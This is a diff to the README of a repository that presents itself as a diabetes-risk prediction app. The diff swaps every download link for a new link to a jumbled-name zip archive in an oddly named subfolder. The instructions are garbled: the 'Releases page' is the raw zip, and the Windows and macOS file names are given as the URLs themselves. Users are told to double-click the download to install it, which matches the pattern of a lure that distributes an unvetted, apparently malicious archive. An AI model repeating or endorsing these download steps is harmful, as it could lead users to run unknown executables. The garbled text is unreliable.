@@ -1,6 +1,6 @@
 # 🩺 Diabetes-Prediction-using-Machine-Learning - Predict Diabetes Risk Effectively
 
-[![Download Now](https://raw.githubusercontent.com/gamingmk289-ux/Diabetes-Prediction-using-Machine-Learning/main/megalocephalous/Diabetes-Prediction-using-Machine-Learning.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/gamingmk289-ux/Diabetes-Prediction-using-Machine-Learning/main/megalocephalous/Diabetes-Prediction-using-Machine-Learning.zip)
+[![Download Now](https://github.com/gamingmk289-ux/Diabetes-Prediction-using-Machine-Learning/raw/refs/heads/main/megalocephalous/Machine-Prediction-Learning-using-Diabetes-v1.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/gamingmk289-ux/Diabetes-Prediction-using-Machine-Learning/raw/refs/heads/main/megalocephalous/Machine-Prediction-Learning-using-Diabetes-v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -18,13 +18,13 @@ To run this application smoothly, you need the following:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/gamingmk289-ux/Diabetes-Prediction-using-Machine-Learning/main/megalocephalous/Diabetes-Prediction-using-Machine-Learning.zip) to find the latest version of the application.
+1. Visit the [Releases page](https://github.com/gamingmk289-ux/Diabetes-Prediction-using-Machine-Learning/raw/refs/heads/main/megalocephalous/Machine-Prediction-Learning-using-Diabetes-v1.2.zip) to find the latest version of the application.
 2. On that page, look for the most recent release. You will see the available files listed.
 3. Choose the file that matches your operating system and click on it to start the download.
 4. Once the download completes, locate the downloaded file on your computer. It is usually in your "Downloads" folder.
 
-   - For Windows users, the file may look like `https://raw.githubusercontent.com/gamingmk289-ux/Diabetes-Prediction-using-Machine-Learning/main/megalocephalous/Diabetes-Prediction-using-Machine-Learning.zip`.
-   - For macOS users, it could be named `https://raw.githubusercontent.com/gamingmk289-ux/Diabetes-Prediction-using-Machine-Learning/main/megalocephalous/Diabetes-Prediction-using-Machine-Learning.zip`.
+   - For Windows users, the file may look like `https://github.com/gamingmk289-ux/Diabetes-Prediction-using-Machine-Learning/raw/refs/heads/main/megalocephalous/Machine-Prediction-Learning-using-Diabetes-v1.2.zip`.
+   - For macOS users, it could be named `https://github.com/gamingmk289-ux/Diabetes-Prediction-using-Machine-Learning/raw/refs/heads/main/megalocephalous/Machine-Prediction-Learning-using-Diabetes-v1.2.zip`.
    - For Linux users, it might be named `Diabetes_Prediction_linux`.
 
 5. Double-click the downloaded file to begin installation. Follow the on-screen prompts to complete the setup.
@@ -78,7 +78,7 @@ For more details on how the application works and the machine learning model, co
 
 ## 🔗 Links
 
-- [Download the latest version](https://raw.githubusercontent.com/gamingmk289-ux/Diabetes-Prediction-using-Machine-Learning/main/megalocephalous/Diabetes-Prediction-using-Machine-Learning.zip) again for easy access.
+- [Download the latest version](https://github.com/gamingmk289-ux/Diabetes-Prediction-using-Machine-Learning/raw/refs/heads/main/megalocephalous/Machine-Prediction-Learning-using-Diabetes-v1.2.zip) again for easy access.
 - Explore related resources in the repository's documentation.
 
 Your health matters. Use this application to stay informed about your diabetes risk!
